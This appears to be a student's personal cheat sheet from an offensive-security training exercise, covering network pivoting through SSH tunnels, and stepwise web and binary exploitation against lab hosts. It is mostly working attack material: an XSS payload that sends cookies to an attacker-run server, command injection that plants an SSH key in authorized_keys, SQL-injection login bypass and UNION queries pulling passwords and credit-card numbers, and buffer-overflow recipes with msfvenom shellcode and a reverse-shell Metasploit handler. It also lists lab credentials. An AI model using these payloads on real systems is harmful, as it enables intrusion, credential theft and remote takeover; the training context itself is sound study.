RUBY PING SWEEP
    for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ; done

xfreerdp /u:student /v:10.50.33.177 -dynamic-resolution +glyph-cache +clipboard
Stack Number	Username	    Password	        jump
4 	            TYCO-503-M 	    YdAHv92QJMCMNcE 	10.50.41.0

192.168.65.10, 10.50.33.177 (WINDOWS)
192.168.65.20, 10.50.38.49 (LINUX)
------------------------------------------------------------------------------------------------------------------------
ssh -MS /tmp/jump student@10.50.39.25
ssh -S /tmp/jump dummy -O forward -D9050
proxychains nmap 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131
proxychains nc 192.168.28.111 80
proxychains nc 192.168.29.100 80
ssh -S /tmp/jump dummy -O forward -L1111:192.168.111:80 -L2222:192.168.28.100
firefox 127.0.0.1:1111
ssh -S /tmp/jump dummy -O forward -L1111:192.168.111:80 -L2222:192.168.28.100 -L4444:192.168.28.111:22
ssh -MS /tmp/t1 student@127.0.0.1 -p 4444
ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22
ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555
-------------------------------------------------------------------------------------------------------------------------

nmap --script=http-enum.nse <ip address>
    if you see robots.txt, go to it in url
<ip address>/robots.txt

create web server on yourself and download cookies
	python3 -m http.server
	<script>document.location="http://10.50.38.49:8000/"+document.cookie;</script>

uploading ssh to web server

	ssh-keygen -t rsa -b 4096 
	enter all the way through
	cat .ssh/id_rsa.pub
	/var/www/.ssh/authorized_keys
		make it if its not there already
	; echo "your key" >> /var/www/.ssh/authorized_keys
	ssh -i /.ssh/id_rsa www-data@<web server ip address>
directory traversal
../../../../../../../../../../../


; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGLL5Du5/UsLHJOQx8daDU7ChRLmemgc2DJY0jpuBnYphjDVU8t+pVSiCvp6Rvkf6X/OduA/rd/1Ha/r8ordhTgb+W3u+4KGpnQ/KkitAVODr9Lv1d4YXbO2onKxLPP1Asvl3E7N4U1+lXDnsWIVz6buftGCMqrSO86cGhiQTPdQu4wxGl/oXM4lvy+icXeBsEWqB1LUZUEYIzOhRUXyvpfaG0pT+5kCg2NKk/ae3iFEPZrxLWmlfqxKHdQ3uRCh/Q4b0TBLDjqt/QYJ2IMcJJHr5lUcGxtL1QEHY1aVsg9+nmrdbj08s1QHcmVGYBHF1c9PfnMIHPo3oNkKHLQUAQ2MmeASN6CxuBm1aK84NT3Ias5YLjuKmVxvinWR8gp/D3cf69eCg+EcLqB1PLc+l+O1HJz50lD+Ml7+8dPT98saUS0m+p3srVz6Djis6ijON/ktbtYnbSlRB5ohOFI6fKQ4azxLBWrzRYve89tNEgjgsyVbxztAGlLJMtoj3nzYW6x2DeuDc+3j5zDrARVnq21va2Ud4lPeByvgRcJvxJFoQyedLlf+52xC7TD8cALdvHV23iVI8msBnofsnTLr5RnU79k918Z3/dtoGs8JZC2AB0jfH5gGLEy2V0FfSyiH835p4UYiYGidZG9NnCUdM+862+BrCE2xo2sFvHAdT98w== student@lin-ops" > /home/billybob/.ssh/authorized_keys


SQL Injection-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
USE
Select the database to use**

SELECT*****
Extract data from a database

UPDATE
Update data in a database

DELETE
Delete data from a database

INSERT INTO
Insert new data into a database

CREATE DATABASE
Create a new database

ALTER DATABASE
Modify an existing database

CREATE TABLE
Create a new table

ALTER TABLE
Modify an existing table

DROP TABLE
Delete a table

CREATE INDEX
Create an index (search key)

DROP INDEX
Delete an index

UNION*********
Combine the result-set of two or more equal SELECT statements**


mysql - gets into sql database
show databases; - shows all databases
	information_schema - holds all information for all other databases
	mysql
	performance_schema
		all default databases
show tables from session;
	shows all tables from the session database
show columns from session.Tires;
	shows all colummns from the Tires table in the session database
select tireid,name,size,cost from session.Tires;
	grabs tiredid,name,size,cost and displays them
select tireid,name,size,cost from session.Tires union select carid,name,color,cost from session.car
	grabs all the data requested from session.Tires and session.car and displays all of them 
	
AUTHENTICATION BYPASS-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
post method
tom' or 1='1
' or 1='1
select id from users where name='tom' or 1='1' and pass='tom' or 1='1' 
	

get method
<URL>/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
do post method after using f12 to get developer console
click network
click correct method
click request
click raw
copy paste into url like above
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
								table_schema, tables, column_name
SQL steps
POST METHOD
1. Identify vulnerable field
	Audi ' or 1='1
2. Identify columns
	Audi ' union select 1,2,3,4,5 #
	will find column numbers and which are hidden to us, have to use placeholders for the ones that are hidden (2 in this case)
3. Create golden statement
	Audi' union select table_schema,2,table_name,column_name,5 from information_schema.columns #
		gets all information about every database, scroll passed defaults to get user made databases,tables,columns
4. Craft query
	Audi' union select studentID,2,username,passwd,5 from session.userinfo #
	Audi' union select id,2,name,pass,5 from session.user #
	Audi' union select 1,2,name,4,5 from session.user #
		Audi' union select name from session.user #
			wont work, need to put the filler column mumbers as placeholders

Database - session
tables - Tires, car ,session_log, user ,userinfo
columns (Tires) - tireid, name, size, cost
	(car) - carid, name,tpe,cost, color, year
	and so on.. 

GET METHOD
1. identify vulnerable field
	put or 1=1 after selection in URL
		http://10.50.26.140/uniondemo.php?Selection=2 or 1=1
2. identify number of columns 
	http://10.50.26.140/uniondemo.php?Selection=2 union select 1,2,3
3. create golden statement
	http://10.50.26.140/uniondemo.php?Selection=2 union select table_schema,column_name,table_name FROM information_schema.columns
4. craft query 
	http://10.50.26.140/uniondemo.php?Selection=2 union select id,pass,name FROM session.user
	http://10.50.26.140/uniondemo.php?Selection=2 union select id,pass,@@version FROM session.user
	
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

' union select id,creditcard_number,order from sqlinjection.payments


------------------------------------------------------------------------------------------- GDB (LINUX) -----------------------------------------------------------------------------------------------------
disass <function> dissasemble portion of the program
info <> supply info for specific stack areas
x/256c $<REGISTER> read characters from specific register
break <address> establish a break point


gdb <./executable>
	get executable into debugger

run <<<$(echo "hello")
	redirects hello into script

pdisass main
	disassembles main function

find next function
pdisass it
	pdisass <hex next to function name>
find function thats red (has vulerability)

run <<<$(python buffer.py)
wiremask.eu

paste long thing into script, run script
	EIP value into registervalue on wiremask.eu to get offset (buffer size)

change script to found offset value
add eip variable set to 4 new characters ("BBBB")
run it

back out of gdb
run this
	env - gdb ./func
show env
	unset all of them
unset env COLUMNS
unset env LINES
run
put in a string thats way too long
	segmentation fault

info proc map
	gets map
make note of first address after heap
make note of last address of stack

find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4			0xff is jmp 0xe4 is esp
 (first after heap) (last of stack)

grab 4 of the addresses and paste them in script, comment them out
break them down into their individual bytes
flip them around
	#0xf7de2b59 = 0xf7 de 2b 59 = \x59\x2b\xde\xf7
copy paste conversion into eip variable

run this in new terminal
	msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
copy paste shell code into python script
	everything that starts with buf
create nop variable
	nop = "\x90" * 15
add nop + buf to print statement

quit out of gdb
./func <<<$(python buffer.py)






-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Gorgas Exploit Development (GED)
XX Mar 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

    Python
    OllyDBG or an equivelent graphical program
        http://www.ollydbg.de/
    GNU Debugger's(GDB) Python Exploit Development Assistance Module
        https://github.com/longld/peda
    MetaSploit
        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

---------------------------------------------------------------------WINDOWS EXPLOITATION---------------------------------------------------------------------------------------------------------------------
mostly same as linux steps

!mona modules into white box - finds exploitable dll's
	go to table to find dll you want
!mona jmp -r esp -m "essfunc.dll" into white bar
	replace .dll with whatever one is vulnerable
window dropdown 2. log data
shows esp locations
take the hex values and do the whole little endian thing again
	take little endian conversion and replace the 4 B's with it
create payload using msfvenom again
	msfvenom -p windows/shell/reverse_tcp lhost=10.50.38.49 lport=8888 -b "\x00" -f python
	lhost is your linux opstation
copy everything other than buf = "" line
paste payload in python script
msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport <port you made in msfvenom>
run multi/handler
run winbuffer.py







